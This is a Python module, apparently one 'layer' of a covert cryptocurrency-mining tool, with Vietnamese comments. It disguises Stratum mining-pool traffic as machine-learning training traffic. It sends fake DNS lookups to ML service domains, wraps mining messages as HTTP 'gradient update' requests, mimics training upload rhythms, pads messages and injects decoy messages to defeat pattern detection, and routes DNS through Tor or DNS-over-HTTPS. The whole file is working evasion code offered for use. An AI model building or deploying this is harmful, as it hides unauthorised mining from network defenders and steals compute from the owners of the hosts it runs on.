"""
network_disguise.py — Layer 6: Network disguise
Connection rhythm, protocol wrap, DNS, fake endpoints
"""
import os
import sys
import time
import json
import socket
import random
import ssl
import struct
import threading
import base64
from typing import Optional, Tuple, List
from urllib.parse import urlparse

# ═══════════════════════════════════════════════════════════════
# FAKE ENDPOINTS — Giả lập ML service connections
# ═══════════════════════════════════════════════════════════════

# Các domain看起来 như AI/ML service — dùng để fake DNS/connection
FAKE_ML_ENDPOINTS = [
    ("api.wandb.ai", 443),              # Weights & Biases
    ("huggingface.co", 443),            # Model hub
    ("s3.amazonaws.com", 443),          # Dataset storage
    ("storage.googleapis.com", 443),    # GCS
    ("blob.core.windows.net", 443),     # Azure
    ("objects.githubusercontent.com", 443),  # Model weights
    ("download.pytorch.org", 443),      # Torch hub
    ("pypi.org", 443),                  # Package
    ("registry.npmjs.org", 443),        # NPM
    ("api.openai.com", 443),            # OpenAI
]

# Fake DNS cache — resolve trước để không query thật
_fake_dns_cache = {}


# ═══════════════════════════════════════════════════════════════
# DNS DISGUISE
# ═══════════════════════════════════════════════════════════════

class DNSDisguise:
    """
    Giả lập DNS queries — tránh leak pool domain.
    
    Strategies:
    1. Pre-resolve → cache (không query thật)
    2. Fake queries song song (ML domains)
    3. DoH (DNS over HTTPS) qua Cloudflare
    4. socks5h (remote DNS qua Tor)
    """
    
    def __init__(self):
        self._cache = {}
        self._fake_query_thread = None
        self._running = False
    
    def pre_resolve(self, domain: str) -> Optional[str]:
        """Resolve domain 1 lần, cache IP. Tránh query lặp lại."""
        if domain in self._cache:
            return self._cache[domain]
        
        try:
            ip = socket.gethostbyname(domain)
            self._cache[domain] = ip
            return ip
        except Exception:
            return None
    
    def resolve_via_tor(self, socks_addr: Tuple[str, int], domain: str) -> Optional[str]:
        """
        Resolve qua SOCKS5 (remote DNS) — DNS query đi qua Tor.
        Không leak DNS ra system resolver.
        """
        try:
            import socks
            s = socks.socksocket()
            s.set_proxy(socks.SOCKS5, socks_addr[0], socks_addr[1], rdns=True)
            s.settimeout(10)
            # Connect tới domain:443 — SOCKS5 sẽ resolve remote
            s.connect((domain, 443))
            ip = s.getpeername()[0]
            s.close()
            self._cache[domain] = ip
            return ip
        except Exception:
            return None
    
    def fake_dns_queries(self):
        """
        Gửi fake DNS queries — giả lập ML service lookups.
        Chạy song song với traffic thật để blend.
        """
        self._running = True
        
        while self._running:
            try:
                # Chọn random endpoint
                domain, _ = random.choice(FAKE_ML_ENDPOINTS)
                
                # Query (bị intercept bởi socks hoặc hệ thống)
                # Không quan trọng trả về gì — chỉ tạo traffic
                try:
                    socket.getaddrinfo(domain, 443, socket.AF_INET)
                except Exception:
                    pass
                
                # Random delay 1-10s
                time.sleep(random.uniform(1, 10))
            except Exception:
                time.sleep(random.uniform(5, 15))
    
    def start_fake_queries(self):
        """Start fake DNS query thread."""
        if self._fake_query_thread is None or not self._fake_query_thread.is_alive():
            self._fake_query_thread = threading.Thread(
                target=self.fake_dns_queries, daemon=True
            )
            self._fake_query_thread.start()
    
    def stop(self):
        self._running = False


# ═══════════════════════════════════════════════════════════════
# CONNECTION RHYTHM — Giả lập training network pattern
# ═══════════════════════════════════════════════════════════════

class ConnectionRhythm:
    """
    Giả lập network connection pattern của AI training:
    
    Training pattern:
    - Download model/dataset: Long burst (100KB-1MB)
    - Upload gradient: Medium burst (1-10MB)  
    - Poll metrics: Small periodic (1-10KB)
    - Idle: 5-30s giữa operations
    - Checkpoint upload: Large burst (100MB-1GB) hiếm
    
    Mining pattern (cần tránh):
    - Constant small messages (Stratum submit)
    - Steady 1 connection giữ lâu
    - Predictable timing
    """
    
    def __init__(self, target_socket: socket.socket = None):
        self.sock = target_socket
        self._running = False
    
    def apply_rhythm(self, sock: socket.socket):
        """Apply rhythm-based send pattern."""
        self.sock = sock
    
    def training_send_pattern(self, data: bytes, data_type: str = "gradient"):
        """
        Send data với training-like pattern.
        
        data_type: "gradient", "metrics", "checkpoint", "model_download"
        """
        if not self.sock:
            return
        
        try:
            if data_type == "gradient":
                # Upload gradient: medium burst + idle
                self._burst_send(data, chunk_size=64 * 1024, delay=0.01)
                time.sleep(random.uniform(5, 15))
                
            elif data_type == "metrics":
                # Small periodic metrics
                self._burst_send(data, chunk_size=4 * 1024, delay=0.005)
                time.sleep(random.uniform(1, 5))
                
            elif data_type == "checkpoint":
                # Large upload (rare)
                self._burst_send(data, chunk_size=1024 * 1024, delay=0.02)
                time.sleep(random.uniform(30, 60))
                
            elif data_type == "model_download":
                # Simulate download (recv pattern)
                time.sleep(random.uniform(10, 30))
                
            else:
                # Default: random burst
                self._burst_send(data, chunk_size=random.choice([4096, 65536]), delay=0.01)
                time.sleep(random.uniform(2, 10))
                
        except Exception:
            pass
    
    def _burst_send(self, data: bytes, chunk_size: int, delay: float):
        """Send data thành chunks với delay giữa chunks."""
        for i in range(0, len(data), chunk_size):
            chunk = data[i:i + chunk_size]
            self.sock.sendall(chunk)
            if delay > 0:
                time.sleep(delay + random.gauss(0, delay * 0.3))
    
    def periodic_reconnect(self, connect_fn, interval_range: Tuple[int, int] = (300, 900)):
        """
        Periodic reconnect — disconnect rồi reconnect.
        Giả lập model re-download hoặc session refresh.
        
        connect_fn: callable trả về socket mới
        """
        self._running = True
        
        while self._running:
            # Hold connection 5-15 phút
            time.sleep(random.uniform(*interval_range))
            
            if not self._running:
                break
            
            try:
                # Disconnect
                if self.sock:
                    self.sock.close()
                
                # Reconnect
                self.sock = connect_fn()
            except Exception:
                time.sleep(random.uniform(10, 30))
    
    def stop(self):
        self._running = False


# ═══════════════════════════════════════════════════════════════
# PROTOCOL DISGUISE — Wrap Stratum thành看起来 như HTTP
# ═══════════════════════════════════════════════════════════════

class ProtocolDisguise:
    """
    Wrap Stratum messages thành看起来 như HTTP/REST API calls.
    
    Trước: mining.submit → pool (Stratum JSON-RPC)
    Sau: POST /api/v1/gradients → fake AI endpoint (wrapped Stratum)
    """
    
    @staticmethod
    def wrap_as_http(stratum_msg: bytes, endpoint: str = "/api/v1/gradients") -> bytes:
        """
        Wrap Stratum message trong HTTP POST.
        """
        # Decode Stratum JSON
        try:
            text = stratum_msg.decode("utf-8", errors="ignore").strip()
            # Lấy JSON object cuối (Stratum có thể multiple lines)
            lines = text.strip().split("\n")
            last_line = lines[-1]
            obj = json.loads(last_line)
        except Exception:
            obj = {"data": stratum_msg[:100]}
        
        # Wrap trong "ML API request"
        wrapped = {
            "request_id": base64.b64encode(os.urandom(8)).decode(),
            "type": "gradient_update",
            "step": random.randint(1, 100000),
            "payload": obj,  # Stratum data ở đây
            "metadata": {
                "model": "resnet50",
                "batch_size": 64,
                "amp": True,
            },
            "timestamp": time.time(),
        }
        
        body = json.dumps(wrapped).encode()
        
        # HTTP POST header
        header = (
            f"POST {endpoint} HTTP/1.1\r\n"
            f"Host: api.training.internal\r\n"
            f"Content-Type: application/json\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"Authorization: Bearer {base64.b64encode(os.urandom(16)).decode()}\r\n"
            f"User-Agent: pytorch-training/2.0\r\n"
            f"\r\n"
        ).encode()
        
        return header + body
    
    @staticmethod
    def unwrap_from_http(http_data: bytes) -> bytes:
        """
        Extract Stratum message từ HTTP wrapper.
        """
        try:
            # Find \r\n\r\n (end of headers)
            idx = http_data.find(b"\r\n\r\n")
            if idx == -1:
                return http_data
            
            body = http_data[idx + 4:]
            obj = json.loads(body)
            
            # Extract original Stratum payload
            payload = obj.get("payload", {})
            return json.dumps(payload).encode()
        except Exception:
            return http_data
    
    @staticmethod
    def fake_stratum_response(stratum_response: bytes) -> bytes:
        """
        Wrap Stratum response thành HTTP response.
        """
        try:
            obj = json.loads(stratum_response.decode("utf-8", errors="ignore").strip())
        except Exception:
            obj = {"result": True}
        
        wrapped = {
            "status": "ok",
            "data": obj,
            "server_time": time.time(),
        }
        
        body = json.dumps(wrapped).encode()
        
        header = (
            f"HTTP/1.1 200 OK\r\n"
            f"Content-Type: application/json\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"Server: nginx/1.24.0\r\n"
            f"\r\n"
        ).encode()
        
        return header + body


# ═══════════════════════════════════════════════════════════════
# TRAFFIC PADDING — Disrupt pattern matching
# ═══════════════════════════════════════════════════════════════

class TrafficPadding:
    """
    Thêm padding vào traffic — disrupt ML pattern detection.
    
    Techniques:
    1. JSON padding (inject random keys)
    2. Random message splitting
    3. Decoy messages
    4. Timing jitter
    """
    
    @staticmethod
    def pad_json_message(data: bytes, min_pad: int = 32, max_pad: int = 512) -> bytes:
        """
        Thêm random padding vào JSON message.
        Stratum parser sẽ ignore unknown keys.
        """
        try:
            text = data.decode("utf-8", errors="ignore").strip()
            lines = text.split("\n")
            
            # Pad mỗi line
            for i, line in enumerate(lines):
                try:
                    obj = json.loads(line)
                    if isinstance(obj, dict):
                        # Inject 1-3 random keys
                        for _ in range(random.randint(1, 3)):
                            pad_len = random.randint(min_pad, max_pad)
                            key = f"_r{random.randint(0, 99999)}"
                            obj[key] = os.urandom(pad_len).hex()[:pad_len]
                        lines[i] = json.dumps(obj, separators=(",", ":"))
                except Exception:
                    continue
            
            return ("\n".join(lines) + "\n").encode()
        except Exception:
            return data
    
    @staticmethod
    def split_message(data: bytes) -> List[bytes]:
        """
        Chia message thành chunks — disrupt packet size analysis.
        """
        if len(data) < 100:
            return [data]
        
        chunks = []
        pos = 0
        
        while pos < len(data):
            # Random chunk size: 10-40% của data
            chunk_size = random.randint(
                max(1, len(data) // 10),
                max(1, len(data) // 3)
            )
            chunks.append(data[pos:pos + chunk_size])
            pos += chunk_size
        
        return chunks
    
    @staticmethod
    def timing_jitter(base_delay: float = 0.01, jitter: float = 0.005):
        """Thêm random delay."""
        time.sleep(max(0, base_delay + random.gauss(0, jitter)))
    
    @staticmethod
    def inject_decoy(sock: socket.socket, direction: str = "out"):
        """
        Gửi fake message để disrupt pattern.
        """
        decoys = [
            {"id": random.randint(1, 99999), "method": "metrics.log", 
             "params": {"loss": random.uniform(0.1, 5.0)}},
            {"id": random.randint(1, 99999), "method": "model.checkpoint",
             "params": {"step": random.randint(1, 100000)}},
            {"jsonrpc": "2.0", "id": None, "method": "heartbeat.ping",
             "params": []},
        ]
        
        try:
            msg = random.choice(decoys)
            line = json.dumps(msg) + "\n"
            sock.sendall(line.encode())
        except Exception:
            pass


# ═══════════════════════════════════════════════════════════════
# DNS OVER HTTPS — Encrypt DNS queries
# ═══════════════════════════════════════════════════════════════

class DoHResolver:
    """
    DNS over HTTPS — resolve DNS qua HTTPS thay vì UDP DNS.
    Tránh DNS query leak ra network monitoring.
    """
    
    DOH_SERVERS = [
        "https://1.1.1.1/dns-query",        # Cloudflare
        "https://8.8.8.8/resolve",           # Google
        "https://dns.google/resolve",        # Google
        "https://cloudflare-dns.com/dns-query",  # Cloudflare
    ]
    
    def __init__(self, use_tor: bool = True, socks_addr: Tuple[str, int] = None):
        self.use_tor = use_tor
        self.socks_addr = socks_addr
    
    def resolve(self, domain: str) -> Optional[str]:
        """Resolve domain qua DoH."""
        import urllib.request
        
        server = random.choice(self.DOH_SERVERS)
        url = f"{server}?name={domain}&type=A"
        
        try:
            # Nếu dùng Tor, set proxy
            if self.use_tor and self.socks_addr:
                import socks
                import urllib.request as req
                
                # Tạo opener với SOCKS proxy
                handler = socks.socksocket
                # Simplified — trong thực tế cần socks proxy handler
                # urllib không hỗ trợ SOCKS trực tiếp
                # → Fallback: dùng request qua SOCKS manually
            
            resp = urllib.request.urlopen(url, timeout=10)
            data = json.loads(resp.read())
            
            answers = data.get("Answer", [])
            for ans in answers:
                if ans.get("type") == 1:  # A record
                    return ans.get("data")
            
            return None
        except Exception:
            return None
    
    def resolve_all(self, domains: List[str]) -> dict:
        """Resolve nhiều domains."""
        results = {}
        for domain in domains:
            ip = self.resolve(domain)
            if ip:
                results[domain] = ip
        return results


# ═══════════════════════════════════════════════════════════════
# CONVENIENCE
# ═══════════════════════════════════════════════════════════════

def setup_network_disguise(socks_addr: Tuple[str, int] = None) -> dict:
    """
    Setup tất cả network disguise components.
    Trả về dict chứa các components.
    """
    dns = DNSDisguise()
    rhythm = ConnectionRhythm()
    padding = TrafficPadding()
    protocol = ProtocolDisguise()
    
    # Start fake DNS queries
    dns.start_fake_queries()
    
    return {
        "dns": dns,
        "rhythm": rhythm,
        "padding": padding,
        "protocol": protocol,
    }
